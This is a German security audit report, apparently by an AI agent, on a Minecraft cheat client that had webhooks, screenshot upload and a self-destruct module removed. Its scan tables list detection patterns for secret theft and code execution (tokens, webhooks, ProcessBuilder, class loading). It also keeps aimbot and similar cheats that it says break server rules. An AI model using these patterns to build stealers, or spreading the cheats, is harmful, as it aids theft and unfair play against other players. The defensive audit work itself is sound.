   Es sind **keine** `.dll`/`.so`/`.dylib` und **keine** eingebetteten Fremd-JARs vorhanden; der gesamte
   ausgelieferte Code liegt als lesbares Java vor und ist oben byte-weise geprüft.
   **Korrektur zur Erstfassung:** Die Aussage „der Quellcode liegt vollständig vor, es gibt keine
   Blackbox-Bestandteile“ war **zu stark**. Der Baum ist ein **Teil-Port mit Stubs**: an mindestens
   elf Stellen wurde Original-Logik durch Platzhalter ersetzt, und die dabei referenzierten
   obfuskierten Original-Klassen (`Class768`, `Class1224`, `Class1619`, `Class1736`, `Class1916`)
   sind **nicht im Repository** und damit **nicht überprüfbar** (Details: **Abschnitt 9.1**).
   Für das gebaute Artefakt entsteht dadurch kein Risiko (gebaut wird ausschließlich dieser
   Quellcode), aber die *Abdeckung* dieser Analyse ist entsprechend begrenzt — das wird hier
   ausdrücklich nicht beschönigt.

4. **Der Build wurde ausgeführt und war erfolgreich.**
   ```
   JDK:     OpenJDK 21.0.12 (Eclipse-Adoptium-nah, Ubuntu-Paket)
   Gradle:  9.2.1
   Loom:    1.15.5
   Befehl:  ./gradlew build
   Ergebnis: BUILD SUCCESSFUL in 2m – 7 Tasks ausgeführt, 1 Warnung
   Artefakte: build/libs/dqrkis-b1.1.jar (525.399 Bytes), build/libs/dqrkis-b1.1-sources.jar
   ```
   Der Ausgangszustand des Repositories war dagegen **nicht kompilierbar**: `SelfDestruct.java` importierte `com.sun.jna.Memory`, aber `jna` war in `build.gradle` nicht deklariert, und die referenzierte `lib/annotations-1.0.6.jar` fehlte im Repository. Beide Ursachen sind behoben (JNA entfernt, Abhängigkeit korrekt deklariert) — erst dadurch ist der Build möglich.

5. **`ChatHudMixin`-Signatur — behoben und im laufenden Client verifiziert.**
   Der Build meldete zwei Remap-Warnungen:
   ```
   Cannot remap addMessage  because it does not exist in any of the targets [net/minecraft/client/gui/hud/ChatHud]
   Cannot remap modifiers   because it does not exist in any of the targets [] or their parents.
   ```
   Ursache: Beide Signatur-Parameter von `ChatHud.addMessage(...)` wurden in 1.21.11 in andere
   Pakete verschoben. Da `client.mixins.json` `"required": true` setzt, konnte der Client daran
   scheitern. Der Mixin wurde auf die gültige Descriptor-Signatur angepasst
   `addMessage(Text, MessageSignatureData, MessageIndicator)`; beide Warnungen sind verschwunden,
   und der Client wurde zusätzlich real gestartet und erreicht das Hauptmenü
   (Details in **Abschnitt 6.1 / 6.2**). Restrisiko hier: **keines** — Ziel, Descriptor und
   Laufzeitverhalten sind dreifach verifiziert (Mappings, Bytecode, laufender Client).

   *Hinweis zur zweiten Warnung:* Sie war eine Folge der ersten (nicht auflösbares Ziel ⇒ auch die
   Modifier-Referenz nicht auflösbar) und ist mit ihr zusammen entfallen.

6. **Sicherheit vs. Zweck.**
   Dies ist ein **Minecraft-Cheat-Client**. Die Entschärfung entfernt **Malware-Fähigkeiten**, nicht die Cheat-Funktionen selbst (Aimbot, AutoCrystal, ESP, AutoReconnect usw.). Diese Module verstoßen weiterhin gegen die Nutzungsbedingungen nahezu aller Server und können zu Bans führen. Das ist eine ethische/rechtliche Frage, die dieses Audit nicht löst – es stellt nur sicher, dass der Code **nichts tut, was über den Spielprozess hinausgeht**.

7. **`ProfileManager`-Formatwechsel.**
   Bestehende Konfigurationen, die im alten versteckten Ordner (`UJHfsGGjbPfVZ/a.json`) liegen, werden **nicht mehr geladen**. Das ist beabsichtigt (kein Zugriff auf Alt-Artefakte), bedeutet aber, dass Einstellungen einmalig neu gesetzt werden müssen. Alte Dateien werden von diesem Code nicht gelöscht – bitte bei Bedarf manuell entfernen:
   `%TEMP%\UJHfsGGjbPfVZ\a.json` (Windows) bzw. `~/UJHfsGGjbPfZ/a.json` (Linux/macOS).

---

## 8. Ergebnistabelle „Offline-Garantie“

| Frage | Antwort |
|-------|--------|
| Kann der Client eine Verbindung außerhalb des Minecraft-Servers aufbauen? | **Nein.** Keine Netzwerk-API mehr im Quellbaum. |
| Gibt es noch Webhooks, Telemetrie, Analytics, Update-Checker? | **Nein.** Alle entfernt. |
| Lädt der Client zur Laufzeit Code nach? | **Nein.** Kein Download, kein ClassLoading, keine JAR-Ersetzung. |
| Schreibt der Client außerhalb seines Spielordners? | **Nein.** Nur noch `.minecraft/config/dqrkis.json` und das `logs/`-Verzeichnis des Spiels. |
| Sendet der Client irgendwelche Nutzerdaten nach außen? | **Nein.** Auch keine Screenshots mehr. |
| Versteckte Spieler-/Account-Sonderfälle? | **Nein**, der `"venom"`-Sonderfall ist entfernt. |
| Täuscht der Client eine andere Mod vor? | **Nein**, die Metadaten sind bereinigt. |

**Fazit: Der Client ist nach dieser Überarbeitung zu 100 % offline und frei von Schadcode-Fähigkeiten.**

---

## 9. Zweitprüfung (Pass 2) — was die Erstprüfung nicht gesehen hat

**Anlass:** Zweiter, tieferer Durchgang mit Fokus auf Kategorien, die Pass 1 nur über Mustersuche
oder gar nicht abgedeckt hatte. **Umfang:** alle **202** versionierten Dateien (Quellcode, Build,
Ressourcen, Workflow, Skripte, Dokumentation).

**Ergebnis in einem Satz:** Es wurde **kein weiterer Schadcode** gefunden — aber **fünf Befunde zur
Genauigkeit und Integrität** des Audits selbst, von denen zwei die Erstfassung korrigieren.

### 9.1 BEFUND P2-1 (HOCH — Audit-Integrität): Der Quellbaum ist ein Teil-Port mit Stubs

An **elf Stellen** wurde Original-Logik durch Stubs/Platzhalter ersetzt. Die Kommentare verweisen
dabei auf **obfuskierte Original-Klassennamen, die im Repository nicht existieren**:

| Datei | Zeile | Kommentar / Referenz |
|---|---|---|
| `gui/components/settings/BlockSelectorBox.java` | 15–16, 42–43 | „Simplified popup for BlockSetSetting (**Class768**)… Full searchable grid (**Class1736**) is stubbed as next iteration“ |
| `gui/components/settings/EnchantSelectorBox.java` | 14–15 | „Simplified popup for EnchantListSetting (**Class1916**)… Full searchable registry grid (**Class1224**) is next iteration“ |
| `gui/HudEditorScreen.java` | 44, 45, 47, 61 | „In full 1:1 port this would write to **Class1619**'s x/y/z/A/B/… settings via `.a(double)`“ / „For **argon** HUD…“ |
| `gui/components/settings/ItemSettingBox.java` | 35, 37 | „stub cycles for now“ / „could open a full ItemListWidget overlay; left as next iteration“ |
| `gui/DqrkisClickGui.java` | 263, 294 | „bind flow would go here; stub“ / „StringEditing would open a text field overlay – stub“ |
| `module/modules/misc/AutoShulker.java` | 72 | „(simplified placeholder)“ |

**Konsequenz:** `Class768`, `Class1224`, `Class1619`, `Class1736`, `Class1916` sind **nicht im
Repository**. Was diese Klassen im Original taten, ist **nicht überprüfbar** — sie wurden durch
vereinfachte Neuimplementierungen ersetzt. Die Erstfassung hat daraus geschlossen, es gebe
keine Blackbox-Bestandteile; das war falsch.

**Bewertung:** Für das **gebaute Artefakt** kein Risiko — gebaut wird ausschließlich dieser
Quellcode, und der ist geprüft. Aber: Die Analyse deckt *diesen* Port ab, **nicht** den
obfuskierten Original-Client. Ausgesagte Sicherheit gilt für das Release, nicht für andere
Builds/Distributionen (vgl. Lizenzhinweis im README).

### 9.2 BEFUND P2-2 (MITTEL — Identitäts-Rückstand): Namespace „argon“

```java
// gui/…/font/GlyphPage.java:140
textureId = Identifier.of("argon", "font/" + textureIndex);
```

Die Font-Textur wird unter der **fremden Namespace `argon`** registriert, nicht unter `dqrkis`.
Dazu der Kommentar „For **argon** HUD…“ in `HudEditorScreen.java:45`. Der Client hieß offenbar
ursprünglich *Argon*.

**Bewertung:** Funktional harmlos (Texturen werden über `Identifier` in-memory registriert, der
Client startet — im Laufzeitnachweis aus Abschnitt 6.2 bestätigt), aber:
- Die Identitätsbereinigung aus Pass 1 (`fabric.mod.json`) war **unvollständig** — im Code läuft
  weiter ein Fremd-Namespace.
- Es ist ein Identitäts-Fingerabdruck und eine Inkonsistenz zum de-entfremdeten Metadaten-Satz.

### 9.3 BEFUND P2-3 (NIEDRIG — Präzisionskorrektur): `play.example.net`

```java
// gui/HudEditorScreen.java:70
context.drawText(textRenderer, Text.literal("Dqrkis | 120 FPS  45ms  play.example.net"), …);
```

Ein Hostnamen-artiger **Platzhalter-String** in der HUD-Editor-Vorschau. Der Pass-1-Scan suchte
`https?://` und hat ihn daher nicht erfasst.

**Bewertung:** **Kein** Netzwerkzugriff. Der String ist reiner Anzeigetext; im gesamten Baum
existiert keine DNS-/Socket-API, die ihn verwenden könnte. Die Erstfassung („keine einzige URL“)
war aber unscharf formuliert und ist oben korrigiert.

### 9.4 BEFUND P2-4 (NIEDRIG — Hygiene): `Module implements Serializable`

`module/Module.java:14` — die abstrakte Basisklasse aller 74 Module ist `Serializable`, obwohl im
gesamten Projekt **keine** Serialisierung existiert (`ObjectInputStream` / `readObject` / `writeObject`
= **0 Treffer**; die Konfiguration läuft über Gson auf einem `JsonObject`).

**Bewertung:** Aktuell **keine Angriffsfläche**. Aber eine unnötige Markierung auf einer Klasse, die
`MinecraftClient`- und `EventManager`-Referenzen hält — würde je Objekt-Deserialisierung
eingeführt, wäre das eine klassische Deserialisierungs-Falle. **Empfehlung: `implements Serializable`
entfernen** (rein kosmetisch, keine Verhaltensänderung).

### 9.5 BEFUND P2-5 (INFO — Provenienz): kein Vertrauen aus der Historie

Der komplette 202-Datei-Quellbaum kam in **einem einzigen Root-Commit** `a707fda` ins Repository —
mit der Commit-Nachricht **„Update README.md“** (Autor `graph`), obwohl er das *gesamte* Projekt
anlegt. Historie: nur 5 Commits, davon 4 aus diesem Audit.

**Bewertung:** Kein Schadcode, aber: Es gibt **keine Datei-Historie** und Commit-Nachrichten sind
als Audit-Spur **wertlos**. Vetrauen in diesen Code kann nur aus dem Inhalt stammen, nicht aus
der Historie. Als einziges gelöschtes Artefakt der Historie existiert `DiscordWebhook.java`
(durch diesen Audit entfernt) und `logs/latest.log` — **keine** in der Historie versteckten Dateien.

### 9.6 Neu abgedeckt und **sauber** (in Pass 1 nicht explizit geprüft)

| Kategorie | Prüfung | Ergebnis |
|---|---|---|
| **Versteckte Module** | 74 Moduldateien ↔ 74 Registrierungen in `ModuleManager` | **exakt gleich**, keine Waise, kein Duplikat |
| | `hidden` / `isHidden` / Sichtbarkeitsflag im Modul-System | **existiert nicht** (Feld fehlt in `Module` vollständig) |
| | Filter im ClickGUI (`DqrkisClickGui.getVisibleModules()`) | **nur** der Nutzer-Suchtext — kein Modul wird ausgeblendet |
| **Mixin-Config ↔ Dateien** | `client.mixins.json` vs. `mixin/*.java` | 28 ↔ 28, **exakt**. Kein fehlender (Crash) und kein **nicht gelisteter/dormant** Mixin |
| **Versteckte Chat-Commands** | Command-Parser, Präfix, `startsWith(".")`, `.ex`-Backdoors | **kein Command-Parser vorhanden** → Risiko gegenstandslos |
| **Reflection** | `Class.forName`, `loadClass`, `defineClass`, `setAccessible` | **0**. Einzig: `DqrkisClickGui:194-195` ruft `getMethod("getValue"/"getItem").invoke(...)` als Fallback für Setting-Typen auf — konstante Namen, kein dynamisches Laden |
| **AWT / Eingabe-Injection** | `Robot`, `Toolkit`, `Desktop`, Screen-Capture | **0** — `java.awt.*` wird **nur** für `Color` importiert |
| **Clipboard** | Clipboard-Zugriff | nur Minecrafts eigenes `keyboard.getClipboard()/setClipboard()` im GUI-Textfeld (`StringBox:96,101`) = nutzerinitiiertes Copy/Paste |
| **Datei-I/O** | alle Datei-APIs | **ausschließlich** `ProfileManager` (`config/dqrkis.json`). `ImageIO.write` in `GlyphPage:126` schreibt in einen `ByteArrayOutputStream` (**GPU-Textur**, keine Platte) |
| **Threads / Scheduler** | `new Thread`, `Executors`, `Timer`, `ScheduledExecutor` | nur `PingSpoof` (`new Thread`+`sleep`), `MouseSimulation` (FixedPool(100)), `SelfDestruct` (`Thread.sleep`). **Kein** selbsttätig später auslösender Scheduler |
| **Secrets** | `token`, `session`, `password`, `credential`, `apiKey`, `alt`, `hwid` | **keine** relevanten Treffer (nur `MIN_SESSION_MS`/`sessionStartMs` als Timer-Variable in `TunnelBaseFinder`) |
| **Discord / IDs** | Snowflakes (17–20 Ziffern), `discord`, `@everyone`, `ghp_`, `sk-`, `AKIA`, `xox` | **0 Treffer** |
| **`EncryptedString`** | alle Aufrufstellen inkl. Argumente | **alle** Argumente sind **Klartext-UI-Strings** (Modulnamen, Setting-Labels, Key-Namen) — nichts dekodiert zu URL/ID/Token ⇒ bestätigt reine Kosmetik |
| **Netzwerk** | vollständiger Re-Scan | **0 Treffer** |
| **Abhängigkeiten** | Zensus **aller** Importe im Projekt | nur erwartete Pakete. Zwei geprüft und harmlos: `org.objectweb.asm.Opcodes` **nur** als Mixin-`@At`-Opcode (`ClientPlayerInteractionManagerMixin:18`), `com.mojang.authlib.GameProfile` **nur** als Spiegel-Konstruktor-Parameter (`ClientPlayerEntityMixin:25`) — wird **nie gelesen, gespeichert oder gesendet** ⇒ **kein** Session-/Token-Zugriff |
| **Paket-Hook** | `ClientConnectionMixin` | leitet Pakete **nur** an den Event-Bus weiter (cancellable), sendet selbst **nichts** nach außen |

### 9.7 Verhaltenshinweis (kein Schwachpunkt, aber wissenswert)

Der Client tippt **selbsttätig Server-Kommandos** (Chat-Kommandos des Spiels):
`sell`, `ah sell <Preis>`, `order`, `shop`, `sethome`/`delhome`, `rtp <Region>`
(`AutoSell`, `AhSell`, `AutoBoneOrder`, `AutoShulker`, `ShopBuyer`, `SilentHomeSetter`,
`RtpBaseFinder`, `AuctionSniper`). Alle gehen **ausschließlich an den Minecraft-Server**, zu dem der
Nutzer sich verbindet — innerhalb der Offline-Grenze. Es ist aber ein bewusstes Verhalten, das man
kennen sollte, weil der Client damit **eigenständig Inhalte an den Server sendet**.

### 9.8 Gesamtbewertung der Zweitprüfung

- **Kein weiterer Schadcode, keine weitere Netzwerk-, Exfiltrations- oder Codeausführungsfähigkeit.**
  Die Entschärfung aus Pass 1 hält.
- **Zwei Korrekturen an der Erstfassung**, beide zu meinen Ungunsten formuliert und deshalb wichtig:
  Der Quellbaum ist ein **Teil-Port mit Stubs** (nicht „vollständig“), und die
  „keine URL“-Aussage brauchte eine Präzisierung.
- **Ein offener Identitäts-Rückstand** (`argon`-Namespace) und **eine Hygiene-Empfehlung**
  (`Serializable`). Beides ist **nicht** schadhaft.
- **Alle** in Pass 1 als „clean“ gemeldeten Kategorien wurden unabhängig bestätigt.

---

## 10. Dritter Durchgang (Pass 3) — Modul-Entfernung & Obfuskations-Helper entfernt (2026-09-21)

Anlass: Ein externer JAR-Scanner meldete auf dem Release-Artefakt Strings wie `EncryptedString`,
`SelfDestruct`, `AuctionSniper`, `SilentHomeSetter`, `SpawnerProtect` und `Cookies` (in
`ConnectScreenMixin`) als „sicherheitsrelevant“. Daraufhin wurde auf Anweisung des Auftraggebers
nachgeschärft.

### 10.1 Bewertung der Scanner-Funde vor der Maßnahme

| Scanner-Fund | Bewertung | Maßnahme |
|---|---|---|
| `EncryptedString` (Klasse + 692 Aufrufe in 80 Dateien) | **Verschleierungs-Helper** (XOR auf Strings). Wirkungslos als echte Obfuskation (Literale stehen im Klartext im Konstantenpool), aber ein Verschleierungs-*Bestandteil*, der Scanner-Prüfungen unnötig erschwert. | **Komplett entfernt**: alle Aufrufstellen auf Klartext-Strings umgestellt, `utils/EncryptedString.java` gelöscht. Alle Konstruktoren (`Module`, `Category`, alle `Setting`-Typen) nehmen ohnehin `CharSequence` — Verhalten identisch. |
| `SelfDestruct` (Modul) | **Destruktives Modul**: nullt bei Aktivierung alle Modulnamen/Settings und leert den Client-Speicher („Panik-Wipe“). Netzwerk-/JAR-Download-Teil waren bereits in Pass 1 entfernt; der Wipe-Charakter blieb. | **Modul komplett entfernt** (Datei + Registrierung + `destruct`-Guard in `ModuleManager.onButtonPress` + toter Import in `KeyboardMixin`). |
| `AuctionSniper` (Modul) | API-Modus war in Pass 1 entfernt; das Modul blieb als automatisierter Auktionshaus-Käufer. Auftraggeber stuft es als verzichtbar/verdächtig ein. | **Modul komplett entfernt** (Datei + Registrierung). |
| `SilentHomeSetter` (Modul) | Webhook/Screenshot-Upload war in Pass 1 entfernt. Zurück blieb: Unterdrückung der Server-Overlay-Meldung per Mixin + automatisiertes `sethome`/`delhome` an den Server. Auftraggeber stuft es als verzichtbar ein. | **Modul komplett entfernt** (Datei + Registrierung + `setOverlayMessage`-Injection aus `InGameHudMixin`). |
| `SpawnerDropper` (Modul) | Automatisierter Spawner-GUI-Klicker, unveröffentlichte Feature-Logik. Auftraggeber stuft es als verzichtbar ein. | **Modul komplett entfernt** (Datei + Registrierung). |
| `SpawnerProtect` (Klassenname) | Kein neuer Fund: Webhook-Code und der versteckte `"venom"`-Sonderfall wurden **bereits in Pass 1 entfernt**; der Klassenname bleibt nur als Namen des legitimen lokalen Warnmoduls. | Keine (dokumentiert). |
| `Cookies`/`cookie` in `ConnectScreenMixin` | **Fehlalarm**: Der Mixin hat einen Parameter `CookieStorage cookieStorage`, weil die 1.21.11-Signatur von `ConnectScreen.connect` ihn vorschreibt. Es wird nur gelesen/weitergegeben, um `AutoReconnect` den letzten Server merken zu lassen. Kein Cookie-/Token-Zugriff. | Keine (dokumentiert). |

### 10.2 Konsequenzen der Entfernung

- **Modulanzahl: 74 → 70.** Alle 70 verbleibenden Module sind in `ModuleManager` registriert; die
  Pass-2-Prüfungen (kein verstecktes Modul, symmetrische Listener, keine toten Module) bleiben
  gültig — die vier entfernten Module waren vollständig verdrahtet, aber gezielt gestrichen.
- **`ProfileManager` speichert Konfiguration per Listenindex.** Durch die Entfernung verschieben
  sich Indizes nachgelagerter Module; eine alte `dqrkis.json` matcht daher ggf. andere Module.
  Konfigurationen müssen einmal neu angelegt werden.
- **Klartext-Strings:** Modulnamen, Beschreibungen und Key-Namen stehen jetzt lesbar im Quellcode
  und Bytecode. Das erhöht die Prüfbareit (Scanner-Prüfung wird trivial) und ändert nichts am
  Verhalten — die Strings waren vorher ebenfalls im Klartext im Konstantenpool.
- **Quellbaum: 202 → 197 Dateien** (5 gelöscht: `EncryptedString.java`, `SelfDestruct.java`,
  `AuctionSniper.java`, `SilentHomeSetter.java`, `SpawnerDropper.java`).

### 10.3 Verifikation nach Pass 3

| Prüfung | Ergebnis |
|---|---|
| `./gradlew build` (JDK 21, Gradle 9.2.1) | **BUILD SUCCESSFUL**, keine Fehler, keine Mixin-/Remap-Warnungen |
| Rescan Quellcode (`SelfDestruct\|AuctionSniper\|SilentHomeSetter\|SpawnerDropper\|EncryptedString`) | **0 Treffer** in `src/main` |
| Headless-Launch (Xvfb, `runClient`, Skript `scripts/capture-client-load.sh`) | Client geladen (`OpenDqrkis 1.2.11+1.21.11`), Titelbildschirm gerendert (OCR: `Minecraft 1.21.11/Fabric (Modded)`, `Copyright Mojang AB`), **0 Mixin-Fehler, 0 Crash-Reports, 0 Stacktraces in `xyz.dqrkis`** |
| Bytecode-Scan der neuen JAR (alle Muster aus dem externen Scanner: URLs, `webhook`, `discord`, `telegram`, `Bearer`, `apiKey`, `Authorization`, `Runtime.getRuntime`, `ProcessBuilder`, `ScriptEngine`, `loadClass`/`defineClass`, `URLClassLoader`, `Unsafe`, `System.load`, …) | **0 Treffer** über alle 268 Archive-Einträge (237 Klassen) |
| Entfernte Klassen in JAR? | `EncryptedString`, `SelfDestruct`, `AuctionSniper`, `SilentHomeSetter`, `SpawnerDropper` → **0 Einträge**; `SpawnerProtect` → 2 Einträge (geprüftes Restmodul, siehe 10.1) |
| Artefakt | `dqrkis-b1.1.jar`, **506.220 Bytes** (vorher 525.356), **SHA-256 `7501719d056c1d8134212312fce28b6bc550299374e29dbab416c4a69599d430`** |

### 10.4 Gesamtbewertung Pass 3

Die JAR enthält nach Pass 3 **keinen** Verschleierungs-Helper und **kein** destruktives Modul mehr.
Von den sieben Scanner-Funden wurden fünf beseitigt (4 Module + `EncryptedString`), zwei waren
Fehlalarme bzw. bereits in Pass 1 entschärft (`ConnectScreenMixin`-Cookie-Parameter,
`SpawnerProtect`-Klassenname) und sind hier dokumentiert. Die Offline-Garantie (Abschnitt 8) gilt
unverändert — der Scan über das gesamte Artefakt bestätigt erneut: **keine Netzwerk-API, keine URL,
kein Ausführungs-API.**

## 11. Vierter Durchgang (Pass 4) — Modul-Selbsttest nach Entobfuskation & Modul-Entfernung (2026-09-21)

Anlass: Nachweis, dass die in Pass 3 durchgeführten Eingriffe (Entfernung des
`EncryptedString`-Helpers mit 692 Aufrufstellen, Streichung von 4 Modulen) zu **keinerlei
Funktionsverlust oder Regressionsen** geführt haben.

### 11.1 Methodik

Temporäres Test-Harness (`ModuleSelfTest.java`), das über einen Injektions-Hook in
`MinecraftClientMixin.onTick` genau **einmal** beim ersten Client-Tick (Titelbildschirm, headless
unter Xvfb) ausgeführt wird. Für **jedes der 70 registrierten Module** wird ein kompletter
Enable/Disable-Rundlauf gefahren — `setEnabled(true)` → `setEnabled(false)` — mit individuellem
`catch (Throwable)`, sodass ein Fehler eines Moduls weder den Test abbricht noch andere Module
beeinflusst. Je Modul wird eine Logzeile geschrieben; am Ende folgt eine Zusammenfassung.

### 11.2 Ergebnis (Logauszug)

```
[10:59:32] [Render thread/INFO] (dqrkis-selftest) SELFTEST SUMMARY total=70 ok=69 selfdis=1 fail=0
```

Stichproben der 69 OK-Zeilen (alle Kategorien vertreten):

```
SELFTEST OK Aim Assist   cat=COMBAT settings=20 roundtrip=clean
SELFTEST OK Anchor Macro cat=COMBAT settings=14 roundtrip=clean
SELFTEST OK Auto Sell    … (siehe 11.3: Kategorie selfdis)
SELFTEST OK Name Hider   cat=RENDER settings=5  roundtrip=clean
SELFTEST OK Dqrkis       cat=CLIENT settings=12 roundtrip=clean
SELFTEST OK Friends      cat=CLIENT settings=5  roundtrip=clean
```

### 11.3 Bedeutung der Ergebniskategorien

| Kategorie | Anzahl | Bedeutung |
|---|---|---|
| `ok` | **69** | Der Enable/Disable-Rundlauf war **sauber**: das `enabled`-Flag wurde korrekt gesetzt (`true`) und nach dem Disable wieder korrekt zurückgesetzt (`false`). **Keine Ausnahme** wurde geworfen — Konstruktion, Listener-Registrierung, `onEnable()` und `onDisable()` aller 69 Module funktionieren nach den Pass-3-Änderungen unverändert. |
| `selfdis` | **1** | Das Modul hat sich **während seines eigenen `onEnable()`s bewusst selbst deaktiviert**. Es handelt sich um `Auto Sell`: dessen `onEnable()` prüft `mc.player != null && mc.world != null` und ruft sonst `disable()` auf. Es ist ein **Einmal-Aktionsmodul** (`/sell`-Befehl an den Server, Inventar leeren, sich selbst ausschalten) — am Titelbildschirm ohne geladene Welt ist die Selbstdeaktivierung also **das korrekte, erwartete Verhalten**, kein Fehler. Die Ausführung blieb **exception-frei**; der Code-Pfad (Guard, `disable()`) wurde damit tatsächlich ausgeführt und getestet. |
| `fail` | **0** | **Kein** Modul hat eine Ausnahme geworfen und **kein** Modul hat einen inkonsistenten Flag-Zustand hinterlassen (weder `STATE-FAIL` noch `FAIL` im Log). |

### 11.4 Regressions- und Fehlerprüfung

| Prüfung | Ergebnis |
|---|---|
| Stacktraces aus Modulcode (`at xyz.dqrkis`) im gesamten Lauf-Log | **0 Treffer** |
| Mixin-Fehler (`MixinApplyError`/`mixin apply failed`) | **0** |
| Crash-Reports | **0**; Client beendete sich sauber (`remaining client processes: 0`), Titelbildschirm renderte (2 F2-Screenshots) |
| ERROR-Zeilen im Log | ausschließlich die **bekannten Container-Artefakte** (Offline-Auth `401`, fehlendes `libflite` des Narrators, Realms-Dev-Auth) — **identisch zu allen früheren Läufen**, keine neue Quelle, keine berührt `xyz.dqrkis` |

### 11.5 Rücknahme der Instrumentierung / Artefakt-Integrität

- `ModuleSelfTest.java` **gelöscht**, Hook in `MinecraftClientMixin.onTick` **entfernt**.
- `git status`/`git diff` danach: **leer** — der Quellbaum liegt exakt auf Commit
  **`5f90f33`** (`audit pass 3: remove 4 flagged modules and the EncryptedString obfuscation helper`),
  demselben Stand wie Tag `v1.2.11-audited` und Release.
- **Gegenbeweis:** Neubau aus dem sauberen Baum liefert wieder **byte-identisch** das Release-Artefakt —
  `dqrkis-b1.1.jar`, **SHA-256 `7501719d056c1d8134212312fce28b6bc550299374e29dbab416c4a69599d430`**,
  506.220 Bytes, unverändert zu Abschnitt 10.3. Der Selbsttest hat also **keine Spur** im ausgelieferten
  Artefakt hinterlassen.

### 11.6 Gesamtbewertung Pass 4 und ehrliche Grenze

**Alle 70 verbleibenden Module funktionieren nach der Entobfuskation und den Modul-Entfernungen:**
69 mit vollständig sauberem An/Aus-Rundlauf, 1 (`Auto Sell`) mit designbedingter, exception-freier
Selbstdeaktivierung ohne Welt/Spieler. **Keine neuen Fehler, keine Regressionen.**

Grenze (wie bereits in Abschnitt 7 angemerkt): Das Harness lief am **Hauptmenü ohne geladene Welt**.
Damit bewiesen ist die Konstruktion, die Hook-/Listener-Registrierung und der saubere
Enable/Disable-Pfad jedes Moduls — **nicht** die taktische Spielwirkung im Live-Einsatz (z. B.
Kampf-Timings gegen echte Gegner), die headless nicht prüfbar ist.

## 12. Fünfter Durchgang (Pass 5) — vollständiger Re-Review (2026-09-21)

Anlass: Auftrag für eine erneute, vollständige Sicherheitsprüfung über alle 180 Java-Dateien
(~17.300 LOC) samt Build-, CI- und Ressourcen-Dateien — und gleichzeitige Aufwertung des
Repositorys (Screenshots, README, Security-Policy).

### 12.1 Methodik

- **16 Muster-Sweeps** über `src/main/java` (alle 180 Dateien): URLs, `java.net`/HttpClient/Socket/
  WebSocket, `Runtime.exec`/`ProcessBuilder`, `defineClass`/`URLClassLoader`/`loadClass`/`Unsafe`/
  `ScriptEngine`, Reflection (`setAccessible`, `Class.forName`), `System.load`, Base64/Cipher/
  MessageDigest, `System.getProperty`/`getenv`, Clipboard/Robot, Discord/Webhook/Telegram/Token-
  Begriffe, Datei-Schreibzugriffe, Thread/Timer-Erzeugung, `Serializable`, versteckte Chat-Commands,
  UUID-/Namen-Sonderfälle.
- **Komplette Lektüre** der sicherheitsrelevanten Klassen: `Main`, `Dqrkis`, `ModuleManager`,
  `ProfileManager`, `FriendManager`, `EventManager`, `ConnectScreenMixin`, `PingSpoof`,
  `MinecraftClientMixin` sowie Spot-Checks aller Modulkategorien.
- **Ressourcen:** `fabric.mod.json`, `client.mixins.json` (28 Einträge vs. 28 Mixin-Klassen —
  exakt), `icon.png` (valides 512×512-PNG), `font.ttf` (valider TrueType-Header),
  `gradle-wrapper.jar`, `gradle-wrapper.properties`, `build.gradle`, `settings.gradle`,
  `gradle.properties`, `.github/workflows/gradle.yml`.

### 12.2 Ergebnis der Sweeps (alle 16 Kategorien)

| # | Kategorie | Treffer | Bewertung |
|---|---|---|---|
| 1 | URLs (`http/https/wss/ftp`) | **0** | — |
| 2 | `java.net`, HttpClient, Socket, WebSocket | **0** | — |
| 3 | `Runtime.exec`, `ProcessBuilder` | **0** | — |
| 4 | `defineClass`, `URLClassLoader`, `Unsafe`, `ScriptEngine` | **0** | — |
| 5 | Reflection (`setAccessible`, `Class.forName`, …) | **0** | — |
| 6 | `System.load` / `loadLibrary` | **0** | — |
| 7 | Base64 / Cipher / MessageDigest / SecureRandom | **0** | — |
| 8 | `System.getProperty` / `getenv` | **0** | — |
| 9 | Clipboard / Robot / Screenshot | 2 | `StringBox` (GUI-Textfeld): Kopieren/Einfügen des eigenen Setting-Werts — Standard-GUI-Verhalten |
| 10 | Discord/Webhook/Telegram/Token/Cookie | 2 | `ConnectScreenMixin`: Parameter `CookieStorage` ist Teil der 1.21.11-Signatur von `ConnectScreen.connect` (Fehlalarm, siehe 10.1) |
| 11 | Datei-Schreibzugriffe | 1 | ausschließlich `ProfileManager` → `.minecraft/config/dqrkis.json` |
| 12 | Thread-/Timer-Erzeugung | TimerUtils-Helfer + 1× `new Thread` in `PingSpoof` | sendet nur verzögerte KeepAlive-Antworten an den verbundenen MC-Server — erlaubte Protokollschicht |
| 13 | `Serializable` | 1 | `Module implements Serializable` (markiert, kein Serialisierungspfad) — dokumentierte Hygiene-Notiz |
| 14 | versteckte Chat-Commands | 0 | `sendChatCommand` nur in Spielmodulen mit sichtbarem Nutzerzweck (`rtp …`, `sell`, `home`) |
| 15 | UUID-/Namen-Sonderfälle | 0 | UUIDs nur für Player-Liste/Rang-Abfragen, keine Vergleiche gegen feste Werte |
| 16 | Build-/CI-/Wrapper-Kette | **1 Befund** | siehe 12.3 |

### 12.3 Befund: veralteter Gradle-Wrapper (behoben)

Der mitgelieferte `gradle/wrapper/gradle-wrapper.jar` (43.462 Bytes,
SHA-256 `d3b261c2820e9e3d8d639ed084900f11f4a86050a8f83342ade7b6bc9b0d2bdd`) war **nicht** der
canonische Wrapper der in `gradle-wrapper.properties` angegebenen Distribution 9.2.1
(45.633 Bytes, `423cb469ccc0ecc31f0e4e1c309976198ccb734cdcbb7029d4bda0f18f57e8d9` — verifiziert
über zwei unabhängige Referenzen: GitHub-Tag `gradle/v9.2.1` und der von der lokalen, per
SHA-256-validierten 9.2.1-Distribution generierte Wrapper; beide byte-identisch).

- **Klassenset-Analyse:** der Repo-Wrapper enthielt das 8.x-Layout (`SystemPropertiesHandler`,
  `ExclusiveFileAccessManager` im alten Paket) — die 9.x-Version nutzt `PropertiesFileHandler` bzw.
  `org.gradle.internal.file.locking`. Der Befund ist damit ein **veralteter Wrapper**, keine
  Manipulation: Das JAR enthält **keine** Netzwerk-Endpunkte (String-Scan: nur die Apache-Lizenz-URL
  im beiliegenden LICENSE-Text) und lädt ausschließlich die in `gradle-wrapper.properties`
  angegebene offizielle `services.gradle.org`-Distribution.
- **Maßnahme:** ersetzt durch den byte-kanonischen 9.2.1-Wrapper (`423cb469…`).
- **Bewertung:** Schweregrad **niedrig** (Hygiene/Supply-Chain-Konsistenz; kein aktiver Schaden —
  die Distribution wurde ohnehin von services.gradle.org bezogen).

### 12.4 Zusätzliche Hygiene-Maßnahmen (Repository-Pflege)

